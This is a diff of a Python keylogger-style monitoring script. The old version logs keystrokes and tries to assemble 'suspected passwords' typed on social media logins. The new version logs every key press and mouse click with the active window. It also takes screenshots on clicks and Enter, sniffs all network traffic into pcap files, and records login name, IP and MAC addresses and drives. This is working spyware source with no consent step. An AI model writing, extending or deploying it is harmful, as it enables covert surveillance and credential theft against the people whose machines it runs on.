@@ -1,303 +1,244 @@
 import logging
 import os
-from datetime import datetime
-import socket
-import uuid
-import subprocess
-import re
-import tempfile
+import sys
+import time
+import threading
+import multiprocessing
 import platform
+import socket
+import subprocess
+import psutil
+import string
+import re
+from datetime import datetime
+import mss
+from pynput import mouse, keyboard
+from scapy.all import sniff, wrpcap, rdpcap
+from scapy.layers.inet import TCP
+from io import StringIO
 
-try:
-    from pynput import mouse, keyboard
-except ImportError:
-    mouse = keyboard = None
-
-try:
-    import psutil
-except ImportError:
-    psutil = None
-
-try:
-    import requests
-    from bs4 import BeautifulSoup
-except ImportError:
-    requests = BeautifulSoup = None
-
-try:
-    import mss
-except ImportError:
-    mss = None
-
-# Create directories for logs and screen captures
 os.makedirs('Logs', exist_ok=True)
 os.makedirs('Screen Captures', exist_ok=True)
+os.makedirs('Packets', exist_ok=True)
 
-# Get the current OS, date, and timestamp
-os_name = platform.system()
 current_datetime = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+os_name = sys.platform
+if os_name == "darwin":
+    os_name = "macOS"
+elif os_name == "win32":
+    os_name = "Windows"
+elif os_name.startswith("linux"):
+    os_name = "Linux"
 
-# Configure logging
-log_file = f'Logs/{os_name}_{current_datetime}.log'
-logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')
+log_file_path = f'Logs/{os_name}_{current_datetime}.log'
 
+def gather_system_info():
+    info = ["System Information:"]
+    info.append(f"Operating System: {platform.system()} {platform.release()} {platform.version()}")
+    info.append(f"Architecture: {platform.machine()}")
+    info.append(f"Processor: {platform.processor()}")
+    info.append(f"CPU Frequency: {psutil.cpu_freq().current if psutil.cpu_freq() else 'N/A'} MHz")
+    info.append(f"Physical cores: {psutil.cpu_count(logical=False)}")
+    info.append(f"Total cores: {psutil.cpu_count(logical=True)}")
+    info.append(f"RAM: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB")
+    info.append(f"Login Name: {os.getlogin()}")
 
-def get_machine_info():
-    info = []
-    info.append(f"Operating System: {platform.system()} {platform.release()}")
+    warned_interfaces = set()
+    for interface, addrs in psutil.net_if_addrs().items():
+        has_ipv4 = False
+        for addr in addrs:
+            if addr.family == socket.AF_INET:
+                info.append(f"IP Address ({interface}): {addr.address}")
+                has_ipv4 = True
+                break
+            elif addr.family == psutil.AF_LINK:
+                info.append(f"MAC Address ({interface}): {addr.address}")
+        if not has_ipv4 and interface not in warned_interfaces:
+            info.append(f"WARNING: No IPv4 address found on {interface} !")
+            warned_interfaces.add(interface)
 
-    if psutil:
-        info.append(f"Network Type: {psutil.net_if_stats()}")
-        info.append(f"User Account: {psutil.users()[0].name}")
-        info.append(f"User Access Level: {psutil.Process().username()}")
-        info.append(f"Drive Mappings: {psutil.disk_partitions()}")
-        info.append(f"Drive Names: {[i.mountpoint for i in psutil.disk_partitions()]}")
-
-    info.append(f"Domain: {socket.getfqdn()}")
-    info.append(f"IPv4: {socket.gethostbyname(socket.gethostname())}")
-    info.append(f"MAC Address: {':'.join(c + d for c, d in zip(*[iter(hex(uuid.getnode())[2:].zfill(12))] * 2))}")
+    for partition in psutil.disk_partitions():
+        info.append(f"Mounted drive: {partition.device} mounted on {partition.mountpoint} with fstype {partition.fstype}")
 
     return '\n'.join(info)
 
+def setup_logging():
+    logging.basicConfig(filename=log_file_path, level=logging.INFO, format='%(asctime)s - %(message)s')
 
-def log_machine_info():
-    logging.info("Machine Information:")
-    logging.info(get_machine_info())
-    logging.info("------------------------")
-
-def get_system_info():
-    system_info = []
-    system_info.append(f"Operating System: {platform.system()} {platform.release()}")
-    system_info.append(f"Operating System Version: {platform.version()}")
-    system_info.append(f"Processor: {platform.processor()}")
-    system_info.append(f"Machine: {platform.machine()}")
-    system_info.append(f"Python Version: {platform.python_version()}")
-
-    if psutil:
-        system_info.append(f"CPU Cores: {psutil.cpu_count()}")
-        system_info.append(f"CPU Frequency: {psutil.cpu_freq().current:.2f} MHz")
-        system_info.append(f"Total Memory: {psutil.virtual_memory().total / (1024 * 1024 * 1024):.2f} GB")
-        system_info.append(f"Available Memory: {psutil.virtual_memory().available / (1024 * 1024 * 1024):.2f} GB")
-        system_info.append(f"Disk Partitions: {[partition.device for partition in psutil.disk_partitions()]}")
-
-    return '\n'.join(system_info)
-
-def log_system_info():
-    logging.info("System Information:")
-    logging.info(get_system_info())
-    logging.info("------------------------")
-
-def get_webpage_source(url):
-    if requests:
-        try:
-            response = requests.get(url)
-            return response.text
-        except:
-            pass
-
-    return None
-
-
-def get_input_name(url, x, y):
-    webpage_source = get_webpage_source(url)
-    if BeautifulSoup and webpage_source:
-        soup = BeautifulSoup(webpage_source, 'html.parser')
-        elements = soup.find_all(lambda tag: tag.name == 'input' or tag.name == 'button')
-
-        for element in elements:
-            if element.has_attr('name'):
-                input_name = element['name']
-                input_rect = element.get('rect', {})
-                input_x = int(input_rect.get('x', 0))
-                input_y = int(input_rect.get('y', 0))
-                input_width = int(input_rect.get('width', 0))
-                input_height = int(input_rect.get('height', 0))
-
-                if input_x <= x <= input_x + input_width and input_y <= y <= input_y + input_height:
-                    return input_name
-
-    return None
-
+    with open(log_file_path, 'a') as log_file:
+        log_file.write("System Information:\n")
+        log_file.write(gather_system_info() + '\n')
+        log_file.write("------------------------\n")
 
 def get_window_info():
     try:
-        from AppKit import NSWorkspace
-        from Quartz import (
-            CGWindowListCopyWindowInfo,
-            kCGWindowListOptionOnScreenOnly,
-            kCGNullWindowID
-        )
+        if os_name == "macOS":
+            from AppKit import NSWorkspace
+            from Quartz import (
+                CGWindowListCopyWindowInfo,
+                kCGWindowListOptionOnScreenOnly,
+                kCGNullWindowID
+            )
 
-        curr_app = NSWorkspace.sharedWorkspace().frontmostApplication()
-        curr_pid = NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationProcessIdentifier']
-        curr_app_name = curr_app.localizedName()
+            curr_app = NSWorkspace.sharedWorkspace().frontmostApplication()
+            curr_pid = NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationProcessIdentifier']
+            curr_app_name = curr_app.localizedName()
 
-        options = kCGWindowListOptionOnScreenOnly
-        windowList = CGWindowListCopyWindowInfo(options, kCGNullWindowID)
+            options = kCGWindowListOptionOnScreenOnly
+            window_list = CGWindowListCopyWindowInfo(options, kCGNullWindowID)
 
-        for window in windowList:
-            pid = window['kCGWindowOwnerPID']
-            windowNumber = window['kCGWindowNumber']
-            ownerName = window['kCGWindowOwnerName']
-            geometry = window['kCGWindowBounds']
-            windowTitle = window.get('kCGWindowName', u'Unknown')
-            if curr_pid == pid:
-                return f"{windowTitle} - {ownerName} - {curr_app_name}"
+            for window in window_list:
+                pid = window['kCGWindowOwnerPID']
+                window_title = window.get('kCGWindowName', u'Unknown')
+                if curr_pid == pid:
+                    process_name = psutil.Process(pid).name()
+                    return f"{window_title} - {process_name}"
+
+        elif os_name == "Windows":
+            import win32gui
+
+            window = win32gui.GetForegroundWindow()
+            window_title = win32gui.GetWindowText(window)
+            _, process_id = win32gui.GetWindowThreadProcessId(window)
+            process_name = psutil.Process(process_id).name()
+
+            return f"{window_title} - {process_name}"
+
+        elif os_name == "Linux":
+            import Xlib.display
+
+            display = Xlib.display.Display()
+            window = display.get_input_focus().focus
+            window_class = window.get_wm_class()
+            window_name = window.get_wm_name()
+
+            process_id = window.get_pid()
+            process_name = psutil.Process(process_id).name()
+
+            return f"{window_name} - {process_name}"
 
     except Exception as e:
-        print(f"Error: {str(e)}")
+        logging.error(f"Error retrieving window information: {str(e)}")
 
     return "Not available"
 
+def log_interaction(info):
+    window_info = get_window_info()
+    process_id = os.getpid()
+    thread_name = threading.current_thread().name
+    logging.info(f"[{process_id}/{thread_name}] {info} - Window Info: {window_info}")
 
-def take_screenshot(process_name):
-    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-    screenshot_dir = "Screen Captures"
-    os.makedirs(screenshot_dir, exist_ok=True)
+def packet_capture_worker(stop_event, filename):
+    packets = []
+    def handle_packet(packet):
+        packets.append(packet)
+    try:
+        sniff(prn=handle_packet, stop_filter=lambda x: stop_event.is_set())
+        wrpcap(filename, packets)
+    except Exception as e:
+        logging.error(f"Failed to capture packets: {str(e)}")
 
+def start_packet_capture(filename):
+    stop_event = multiprocessing.Event()
+    packet_process = multiprocessing.Process(target=packet_capture_worker, args=(stop_event, filename))
+    packet_process.start()
+    return stop_event, packet_process
+
+def stop_packet_capture(stop_event, packet_process):
+    stop_event.set()
+    packet_process.join()
+
+def sanitize_filename(filename):
+    """
+    Sanitize the filename by removing or replacing all invalid characters
+    and ensuring the filename does not contain path traversal or other
+    problematic patterns.
+    """
+    filename = re.sub(r'[\\/*?:"<>|]', "_", filename)  # Replace reserved characters Windows doesn't allow in filenames
+    filename = re.sub(r'\s+', '_', filename)  # Replace all whitespace with underscore
+    filename = ''.join(c for c in filename if c.isalnum() or c in "-_.()")
+    return filename.strip("_")  # Remove any trailing underscores that might cause issues
+
+def take_screenshot(action):
+    directory = "Screen Captures"
+    os.makedirs(directory, exist_ok=True)  # Ensure the directory exists
     with mss.mss() as sct:
-        for i, monitor in enumerate(sct.monitors[1:], start=1):
-            screenshot_name = f"{screenshot_dir}/{timestamp}_{process_name}_monitor{i}.png"
-            sct.shot(mon=i, output=screenshot_name)
+        window_info = get_window_info()
+        if ' - ' in window_info:
+            window_title, process_name = window_info.split(' - ', 1)  # Split safely with maxsplit
+        else:
+            window_title = 'unknown'
+            process_name = psutil.Process().name()
 
+        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        sanitized_title = sanitize_filename(window_title)
+        sanitized_process = sanitize_filename(process_name)
+        filename = f"{directory}/{timestamp}_{sanitized_title}_{sanitized_process}.png"
 
-def is_social_media_url(url):
-    social_media_urls = [
-        'facebook.com', 'twitter.com', 'instagram.com', 'linkedin.com',
-        'youtube.com', 'pinterest.com', 'reddit.com', 'tumblr.com',
-        'vk.com', 'weibo.com', 'tiktok.com', 'snapchat.com',
-        'twitch.tv', 'tinder.com', 'bumble.com', 'hinge.com'
-    ]
-    return any(
-        url.lower().startswith(f'https://{sm}/') or url.lower().startswith(f'http://{sm}/') for sm in social_media_urls)
-
-
-def extract_social_media_info(text):
-    email_regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
-    username_regex = r'(?i)@[a-z0-9_]+'
-    emails = re.findall(email_regex, text)
-    usernames = re.findall(username_regex, text)
-    return emails, usernames
-
-
-def on_press(key):
-    global active_window, active_url, suspected_password, password_entry_started
-
-    window_info = get_window_info()
-    process_name = window_info.split(' - ')[1] if ' - ' in window_info else 'unknown'
-    log_entry = f'Key pressed: {key} - Process: {process_name} - Window Info: {window_info}'
-
-    if isinstance(key, keyboard.KeyCode):
-        emails, usernames = extract_social_media_info(key.char)
-        if emails:
-            log_entry += f' - Social Media Email(s): {", ".join(emails)}'
-            active_window = window_info
-            active_url = window_info.split(' - URL:')[-1].strip() if ' - URL:' in window_info else ''
-            password_entry_started = True
-            suspected_password = ''
-        if usernames:
-            log_entry += f' - Social Media Username(s): {", ".join(usernames)}'
-            active_window = window_info
-            active_url = window_info.split(' - URL:')[-1].strip() if ' - URL:' in window_info else ''
-            password_entry_started = True
-            suspected_password = ''
-
-        if password_entry_started:
-            if key == keyboard.Key.enter:
-                log_entry += f' - Suspected Password: [{suspected_password}]'
-                password_entry_started = False
-            elif key == keyboard.Key.backspace:
-                suspected_password = suspected_password[:-1]
-            else:
-                suspected_password += key.char
-
-    log_entry = f'[Keyboard Input] {log_entry}'
-    logging.info(log_entry)
-
-    if key == keyboard.Key.enter:
-        take_screenshot(process_name)
-
-
-def on_release(key):
-    window_info = get_window_info()
-    process_name = window_info.split(' - ')[1] if ' - ' in window_info else 'unknown'
-    log_entry = f'Key released: {key} - Process: {process_name} - Window Info: {window_info}'
-    log_entry = f'[Keyboard Release] {log_entry}'
-    logging.info(log_entry)
-
-
-def on_move(x, y):
-    window_info = get_window_info()
-    process_name = window_info.split(' - ')[1] if ' - ' in window_info else 'unknown'
-    log_entry = f'Mouse moved to ({x}, {y}) - Process: {process_name} - Window Info: {window_info}'
-
-    if ' - URL:' in window_info:
-        url = window_info.split(' - URL:')[-1].strip()
-        input_name = get_input_name(url, x, y)
-        if input_name:
-            log_entry += f' - Input: ({input_name})'
-
-    log_entry = f'[Mouse Movement] {log_entry}'
-    logging.info(log_entry)
-
+        try:
+            sct.shot(output=filename)
+            log_interaction(f"Screenshot captured: {filename}")
+        except Exception as e:
+            logging.error(f"Failed to capture screenshot: {str(e)}")
 
 def on_click(x, y, button, pressed):
-    global active_window, active_url, suspected_password, password_entry_started
+    if pressed:
+        action = f"Mouse clicked at ({x}, {y}) with button {button}"
+        log_interaction(f"[Mouse Click] {action}")
+        take_screenshot(action)
 
-    if pressed and button == mouse.Button.left:
-        window_info = get_window_info()
-        process_name = window_info.split(' - ')[1] if ' - ' in window_info else 'unknown'
-        log_entry = f'Mouse clicked at ({x}, y) with {button} - Process: {process_name} - Window Info: {window_info}'
+def on_press(key):
+    try:
+        action = f"Key pressed: {key}"
+        log_interaction(f"[Keyboard Input] {action}")
+        if key == keyboard.Key.enter:
+            take_screenshot(action)
 
-        if ' - URL:' in window_info:
-            url = window_info.split(' - URL:')[-1].strip()
-            input_name = get_input_name(url, x, y)
-            if input_name:
-                log_entry += f' - Input: ({input_name})'
-                if input_name.lower() == 'login' or input_name.lower() == 'sign in':
-                    log_entry += f' - Suspected Password: [{suspected_password}]'
-                    password_entry_started = False
+        # Check for related packet captures with exact line numbers
+        related_packets = []
+        pcap_file = f'Packets/{os_name}_{current_datetime}.pcap'
+        if os.path.exists(pcap_file):
+            packets = rdpcap(pcap_file)
+            for i, pkt in enumerate(packets):
+                if pkt.haslayer(TCP) and pkt[TCP].payload:
+                    payload = pkt[TCP].payload.load.decode('utf-8', 'ignore')
+                    if str(key) in payload:
+                        related_packets.append((i + 1, payload))  # Store line number and payload
 
-            if is_social_media_url(url):
-                social_media_name = url.split('//')[1].split('/')[0].split('.')[0].capitalize()
-                log_entry += f' - Social Media: {social_media_name}'
+        if related_packets:
+            interaction_details = ", ".join(f"Line {line}: {data}" for line, data in related_packets)
+            log_interaction(f"[Keyboard Input] {action} - Related Packets: {interaction_details}")
 
-        log_entry = f'[Mouse Click] {log_entry}'
-        logging.info(log_entry)
-        take_screenshot(process_name)
+    except Exception as e:
+        logging.error(f"Error processing key press: {str(e)}")
 
+def on_release(key):
+    action = f"Key released: {key}"
+    log_interaction(f"[Keyboard Release] {action}")
 
-def on_scroll(x, y, dx, dy):
-    window_info = get_window_info()
-    process_name = window_info.split(' - ')[1] if ' - ' in window_info else 'unknown'
-    log_entry = f'Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy}) - Process: {process_name} - Window Info: {window_info}'
-    log_entry = f'[Mouse Scroll] {log_entry}'
-    logging.info(log_entry)
+def main():
+    setup_logging()
+    gather_system_info()  # Call gather_system_info() without printing the result
+    stop_event, packet_process = start_packet_capture(f'Packets/{os_name}_{current_datetime}.pcap')
 
-
-# Log machine information at the start of the script
-log_machine_info()
-
-# Log system information at the start of the script
-log_system_info()
-
-# Initialize global variables
-active_window = ''
-active_url = ''
-suspected_password = ''
-password_entry_started = False
-
-# Set up the listener threads if pynput is available
-if mouse and keyboard:
     keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
-    mouse_listener = mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)
+    mouse_listener = mouse.Listener(on_click=on_click)
 
-    # Start the listener threads
     keyboard_listener.start()
     mouse_listener.start()
 
-    # Keep the main thread running
-    keyboard_listener.join()
-    mouse_listener.join()
-else:
-    logging.info("pynput library is not available. Input monitoring will not be performed.")
+    try:
+        logging.info("Script started. Press Ctrl+C to stop.")
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        logging.info("Script interrupted by user.")
+    finally:
+        keyboard_listener.stop()
+        mouse_listener.stop()
+        stop_packet_capture(stop_event, packet_process)
+        logging.info("Script finished gracefully.")
+
+if __name__ == "__main__":
+    multiprocessing.freeze_support()
+    main()
